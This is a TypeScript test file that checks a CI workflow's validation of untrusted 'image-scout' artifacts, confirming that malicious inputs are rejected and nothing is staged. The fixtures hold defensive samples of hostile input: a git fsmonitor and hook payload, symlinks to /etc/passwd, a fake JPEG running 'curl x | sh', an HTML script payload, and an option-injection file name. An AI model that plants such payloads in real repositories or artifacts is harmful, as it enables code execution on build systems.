/**
 * M1 closeout: the image-scout artifact trust boundary.
 *
 * The generate job runs third-party code, so its artifact is untrusted input to the
 * write-enabled publish job. These tests take the publish job's real validation step out of
 * the parsed workflow (js-yaml) and run it with bash against synthetic artifacts, both valid
 * and malicious. A malicious artifact must fail the step (fail closed) and leave nothing
 * staged; a valid one must be copied, as plain 0644 files only, into a new empty directory
 * that the publish step, not the artifact, turns into a git repository.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync, linkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import yaml from 'js-yaml';

type Step = { name?: string; uses?: string; run?: string; env?: Record<string, string>; with?: Record<string, unknown>; 'working-directory'?: string };
const wf = yaml.load(execFileSync('cat', ['.github/workflows/image-scout.yml'], { encoding: 'utf8' })) as { jobs: Record<string, { steps: Step[] }> };
const publish = wf.jobs.publish.steps;
const download = publish.find((s) => s.uses?.startsWith('actions/download-artifact@'))!;
const validate = publish.find((s) => /^Validate results/.test(s.name ?? ''))!;
const push = publish.find((s) => /^Publish results/.test(s.name ?? ''))!;

const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46, 0, 1]);
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0x24, 0, 0, 0]), Buffer.from('WEBPVP8 ')]);

type Fixture = (src: string) => void;
/** A valid artifact like a real scout run: results, a contact sheet, snapshots, editorial images. */
const valid: Fixture = (src) => {
  writeFileSync(join(src, 'results.json'), '{"harbor":[]}');
  writeFileSync(join(src, 'harbor-sunrise.jpg'), JPEG);
  writeFileSync(join(src, 'pulse.json'), '{"events":[]}');
  writeFileSync(join(src, 'candidates.json'), '[]');
  mkdirSync(join(src, 'editorial'));
  writeFileSync(join(src, 'editorial', 'img-night-trails-600.webp'), WEBP);
};

const real = (cmd: string) => execFileSync('bash', ['-c', `command -v ${cmd}`], { encoding: 'utf8' }).trim();
const REAL = { head: real('head'), node: real('node') };

/**
 * Runs the workflow's validation step on an artifact built by `build`. `head` and `node`, the
 * only commands that read file content, are wrapped by logging shims placed first on PATH, so
 * a test can prove that no content was read. `find` can be replaced to simulate enumeration
 * failures.
 */
function runValidation(build: Fixture, opts: { find?: string } = {}) {
  const temp = mkdtempSync(join(tmpdir(), 'scout-publish-test-'));
  const src = join(temp, 'scout-artifact');
  const out = join(temp, 'scout-publish');
  const shims = join(temp, 'shims');
  const log = join(temp, 'content-reads.log');
  mkdirSync(src);
  mkdirSync(shims);
  writeFileSync(log, '');
  for (const [cmd, path] of Object.entries(REAL)) writeFileSync(join(shims, cmd), `#!/bin/bash\necho "${cmd} $*" >> "$SHIM_LOG"\nexec ${path} "$@"\n`, { mode: 0o755 });
  if (opts.find) writeFileSync(join(shims, 'find'), `#!/bin/bash\n${opts.find}\n`, { mode: 0o755 });
  build(src);
  const r = spawnSync('bash', ['-c', validate.run!], { cwd: temp, encoding: 'utf8', env: { PATH: `${shims}:${process.env.PATH}`, SRC: src, OUT: out, SHIM_LOG: log } });
  const staged = existsSync(out) ? execFileSync('find', ['.', '-mindepth', '1'], { cwd: out, encoding: 'utf8' }).trim().split('\n').filter(Boolean).sort() : null;
  const contentReads = readFileSync(log, 'utf8').trim().split('\n').filter(Boolean);
  return { temp, out, status: r.status, output: `${r.stdout}${r.stderr}`, staged, contentReads };
}

test('the publish job downloads outside the workspace and publishes only the staged directory', () => {
  assert.equal(download.with?.path, '${{ runner.temp }}/scout-artifact');
  assert.equal(validate.env?.SRC, '${{ runner.temp }}/scout-artifact');
  assert.equal(validate.env?.OUT, '${{ runner.temp }}/scout-publish');
  assert.equal(push['working-directory'], '${{ runner.temp }}/scout-publish');
  assert.deepEqual(publish.map((s) => s.uses?.split('@')[0] ?? s.name), ['actions/download-artifact', validate.name, push.name]);
  assert.match(validate.run!, /^set -euo pipefail$/m);
  // Every entry is validated before anything is copied, and copies are fresh 0644 files.
  assert.ok(validate.run!.indexOf('done < <(find . -mindepth 1 -print0)') < validate.run!.indexOf('mkdir -m 0755 -- "$OUT"'));
  assert.match(validate.run!, /install -D -m 0644 -- "\$p" "\$OUT\/\$\{p#\.\/\}"/);
  // The privileged git operations never trust repository-provided or ambient git config/hooks.
  assert.match(push.run!, /\[ ! -e \.git \] \|\|/);
  assert.match(push.run!, /export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=\/dev\/null/);
  assert.match(push.run!, /git config core\.hooksPath \/dev\/null/);
});

test('a valid artifact is staged as plain 0644 files in a new directory without .git', () => {
  const r = runValidation((src) => {
    valid(src);
    chmodSync(join(src, 'pulse.json'), 0o755); // executable bits are not carried over
  });
  try {
    assert.equal(r.status, 0, r.output);
    assert.match(r.output, /Staged 5 files \(\d+ bytes\) in a clean publishing directory/);
    // Positive control for the content-read shims used below: a valid artifact is read.
    assert.ok(r.contentReads.some((l) => l.startsWith('head ')) && r.contentReads.some((l) => l.startsWith('node ')), JSON.stringify(r.contentReads));
    assert.deepEqual(r.staged, ['./candidates.json', './editorial', './editorial/img-night-trails-600.webp', './harbor-sunrise.jpg', './pulse.json', './results.json']);
    for (const f of r.staged!.filter((p) => p.includes('.'))) {
      const st = statSync(join(r.out, f));
      if (st.isFile()) assert.equal(st.mode & 0o777, 0o644, `${f} mode`);
    }
    assert.ok(!existsSync(join(r.out, '.git')));
  } finally {
    rmSync(r.temp, { recursive: true, force: true });
  }
});

test('malicious artifacts are rejected (fail closed) and nothing is staged', () => {
  const cases: [string, Fixture, RegExp][] = [
    ['.git directory with config', (s) => { mkdirSync(join(s, '.git')); writeFileSync(join(s, '.git', 'config'), '[core]\n\tfsmonitor = touch /tmp/pwned\n'); }, /unexpected directory: \.\/\.git/],
    ['empty .git directory', (s) => mkdirSync(join(s, '.git')), /unexpected directory: \.\/\.git/],
    ['executable hook', (s) => { mkdirSync(join(s, '.git', 'hooks'), { recursive: true }); writeFileSync(join(s, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho pwned\n', { mode: 0o755 }); }, /unexpected directory: \.\/\.git/],
    ['.gitattributes', (s) => writeFileSync(join(s, '.gitattributes'), '* filter=evil\n'), /unexpected file name: \.\/\.gitattributes/],
    ['.gitmodules', (s) => writeFileSync(join(s, '.gitmodules'), '[submodule "x"]\n'), /unexpected file name: \.\/\.gitmodules/],
    ['dot-file with an allowed extension', (s) => writeFileSync(join(s, '.hidden.json'), '{}'), /unexpected file name: \.\/\.hidden\.json/],
    ['symlink to a system file', (s) => symlinkSync('/etc/passwd', join(s, 'evil.jpg')), /symlink in results: \.\/evil\.jpg/],
    ['symlinked editorial directory', (s) => { rmSync(join(s, 'editorial'), { recursive: true }); symlinkSync('/', join(s, 'editorial')); }, /symlink in results: \.\/editorial/],
    ['dangling symlink', (s) => symlinkSync('../../outside.json', join(s, 'up.json')), /symlink in results: \.\/up\.json/],
    ['named pipe', (s) => execFileSync('mkfifo', [join(s, 'pipe.json')]), /special file in results: \.\/pipe\.json/],
    ['nested directory', (s) => { mkdirSync(join(s, 'editorial', 'deep'), { recursive: true }); writeFileSync(join(s, 'editorial', 'deep', 'x.webp'), WEBP); }, /unexpected directory: \.\/editorial\/deep/],
    ['unexpected top-level directory', (s) => { mkdirSync(join(s, 'scripts')); writeFileSync(join(s, 'scripts', 'a.json'), '{}'); }, /unexpected directory: \.\/scripts/],
    ['newline in a file name', (s) => writeFileSync(join(s, 'a\n.jpg'), JPEG), /unexpected file name: \$\.\/a\\n\.jpg/],
    ['leading dash (option injection)', (s) => writeFileSync(join(s, '-rf.json'), '{}'), /unexpected file name: \.\/-rf\.json/],
    ['parent-directory lookalike', (s) => writeFileSync(join(s, '..json'), '{}'), /unexpected file name: \.\/\.\.json/],
    ['executable content', (s) => writeFileSync(join(s, 'run.sh'), '#!/bin/sh\n', { mode: 0o755 }), /unexpected file name: \.\/run\.sh/],
    ['script disguised as a JPEG', (s) => writeFileSync(join(s, 'evil.jpg'), '#!/bin/sh\ncurl x | sh\n'), /not a JPEG signature: \.\/evil\.jpg/],
    ['HTML disguised as a WebP', (s) => writeFileSync(join(s, 'editorial', 'x-600.webp'), '<script>alert(1)</script>'), /not a WebP signature: \.\/editorial\/x-600\.webp/],
    ['invalid JSON', (s) => writeFileSync(join(s, 'pulse.json'), '{not json'), /invalid JSON: \.\/pulse\.json/],
    ['hard link is copied, not linked', (s) => linkSync(join(s, 'results.json'), join(s, 'second.json')), /^$/],
    ['missing results.json', (s) => rmSync(join(s, 'results.json')), /results\.json is missing/],
    ['too many files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{}'); }, /too many files \(more than 500\)/],
    ['too large', (s) => { writeFileSync(join(s, 'big.webp'), WEBP); execFileSync('truncate', ['-s', '53000000', join(s, 'big.webp')]); }, /results too large \(more than 52428800 bytes\)/],
  ];
  for (const [name, mutate, expected] of cases) {
    const r = runValidation((src) => {
      valid(src);
      mutate(src);
    });
    try {
      if (name.startsWith('hard link')) {
        // Not malicious: accepted, but the staged copy is an independent file.
        assert.equal(r.status, 0, `${name}: ${r.output}`);
        assert.equal(statSync(join(r.out, 'second.json')).nlink, 1, `${name}: staged copy is not a link`);
        continue;
      }
      assert.notEqual(r.status, 0, `${name}: validation must fail\n${r.output}`);
      // Paths are printed shell-quoted (${p@Q}); compare without the quotes.
      assert.match(r.output.replace(/'/g, ''), expected, `${name}: ${r.output}`);
      assert.equal(r.staged, null, `${name}: nothing may be staged`);
    } finally {
      rmSync(r.temp, { recursive: true, force: true });
    }
  }
});

test('limits are enforced from metadata before any file content is read', () => {
  const cases: [string, Fixture, RegExp][] = [
    ['oversized JSON (invalid content, so parsing would also fail)', (s) => { writeFileSync(join(s, 'pulse.json'), '{'); execFileSync('truncate', ['-s', '11000000', join(s, 'pulse.json')]); }, /JSON file too large \(11000000 bytes\): \.\/pulse\.json/],
    ['cumulative size over 50 MB', (s) => { for (let i = 0; i < 6; i++) { writeFileSync(join(s, `big${i}.webp`), WEBP); execFileSync('truncate', ['-s', '9000000', join(s, `big${i}.webp`)]); } }, /results too large \(more than 52428800 bytes\)/],
    ['more than 500 files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{bad'); }, /too many files \(more than 500\)/],
  ];
  for (const [name, mutate, expected] of cases) {
    const r = runValidation((src) => { valid(src); mutate(src); });
    try {
      assert.notEqual(r.status, 0, `${name}: must fail\n${r.output}`);
      assert.match(r.output.replace(/'/g, ''), expected, `${name}: ${r.output}`);
      assert.deepEqual(r.contentReads, [], `${name}: no content may be read before the limits pass`);
      assert.equal(r.staged, null, `${name}: nothing staged`);
    } finally {
      rmSync(r.temp, { recursive: true, force: true });
    }
  }
});

test('enumeration failures fail closed, even after partial output', () => {
  const cases: [string, string][] = [
    ['find reports an error after listing some entries', `printf 'f\\t13\\t./results.json\\0'; echo "find: './editorial': Permission denied" >&2; exit 1`],
    ['find is killed mid-listing', `printf 'f\\t13\\t./results.json\\0d\\t4096\\t./editorial\\0'; kill -9 $$`],
    ['find fails with no output', 'exit 2'],
  ];
  for (const [name, findScript] of cases) {
    const r = runValidation(valid, { find: findScript });
    try {
      assert.notEqual(r.status, 0, `${name}: must fail\n${r.output}`);
      assert.match(r.output, /::error::could not enumerate the artifact/, `${name}: ${r.output}`);
      assert.deepEqual(r.contentReads, [], `${name}: nothing read`);
      assert.equal(r.staged, null, `${name}: nothing staged`);
    } finally {
      rmSync(r.temp, { recursive: true, force: true });
    }
  }
});

test('the staged directory has no route back to the artifact', () => {
  const r = runValidation(valid);
  try {
    assert.equal(r.status, 0, r.output);
    const walk = (d: string): string[] => readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(join(d, e.name)) : [join(d, e.name)]));
    for (const f of walk(r.out)) {
      const st = statSync(f, { throwIfNoEntry: true });
      assert.ok(st.isFile() && st.nlink === 1, `${f}: independent regular file`);
    }
  } finally {
    rmSync(r.temp, { recursive: true, force: true });
  }
});
